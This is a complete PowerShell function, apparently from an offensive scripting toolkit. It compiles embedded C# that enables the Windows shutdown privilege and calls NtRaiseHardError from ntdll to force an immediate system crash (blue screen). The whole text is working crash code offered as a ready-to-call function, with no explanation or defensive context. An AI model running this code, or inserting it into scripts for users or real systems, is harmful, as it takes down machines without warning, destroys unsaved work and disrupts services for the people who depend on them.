function Invoke-BSOD {
$s = @"
using System;
using System.Runtime.InteropServices;

public static class C{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@
$c = new-object -typename system.CodeDom.Compiler.CompilerParameters
$c.CompilerOptions = '/unsafe'
$a = Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c
[C]::Kill()
}